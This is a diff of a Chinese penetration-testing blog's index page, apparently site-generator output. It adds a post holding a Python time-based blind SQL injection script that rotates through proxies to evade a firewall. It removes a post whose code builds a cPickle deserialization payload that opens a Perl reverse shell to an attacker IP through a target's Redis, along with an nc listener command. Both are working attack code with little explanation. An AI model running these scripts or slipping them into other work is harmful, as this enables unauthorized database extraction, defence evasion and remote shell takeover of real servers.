@@ -117,6 +117,140 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2016/11/08/sql-proxy.html" >Sql代理注入</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-11-08  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># coding: utf-8</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
+	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
+	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
+	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
+	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
+			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
+			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+			<span class="token keyword">try</span><span class="token punctuation">:</span>
+				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
+			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+				<span class="token keyword">pass</span>
+
+	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token keyword">try</span><span class="token punctuation">:</span>
+			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
+			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
+				<span class="token keyword">break</span>
+		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
+<p>实测还没测出来，感觉有点悬。</p>
+
+	
+
+	</div>
+  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># coding: utf-8</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
+	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
+	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
+	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
+	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
+			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
+			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+			<span class="token keyword">try</span><span class="token punctuation">:</span>
+				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
+			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+				<span class="token keyword">pass</span>
+
+	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token keyword">try</span><span class="token punctuation">:</span>
+			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
+			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
+				<span class="token keyword">break</span>
+		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
+<p>实测还没测出来，感觉有点悬。</p>
+
+	
+	</div>
+  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2016/10/25/cve-2016-6802.html" >CVE-2016-6802</a>
 		</h3>
 		</div>
@@ -523,96 +657,6 @@ xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/07/26/python-cpickle-shell.html" >Python cPickle 反序列化shell</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-07-26  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
-<blockquote>
-<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
-</blockquote>
-<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
-<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-import cPickle
-import os
-import redis
-
-class exp(object):
-    def __reduce__(self):
-        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
-        return (os.system, (s,))
-   
-e &#x3D; exp()
-s &#x3D; cPickle.dumps(e)
-
-r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
-r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>
-
-	
-
-	</div>
-  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
-<blockquote>
-<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
-</blockquote>
-<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
-<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-import cPickle
-import os
-import redis
-
-class exp(object):
-    def __reduce__(self):
-        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
-        return (os.system, (s,))
-   
-e &#x3D; exp()
-s &#x3D; cPickle.dumps(e)
-
-r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
-r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>
-
-	
-	</div>
-  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -670,7 +714,7 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>51</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>52</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -691,6 +735,10 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/04/23/sandbox-info-collect.html" ><i class="fa fa-file-o"></i>沙盒环境信息收集</a>
+      </li>
+    
+      <li>
         <a href="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html" ><i class="fa fa-file-o"></i>BrokenSesame-阿里云数据库远程命令执行</a>
       </li>
     
@@ -704,10 +752,6 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
     
       <li>
         <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
       </li>
     
   </ul>
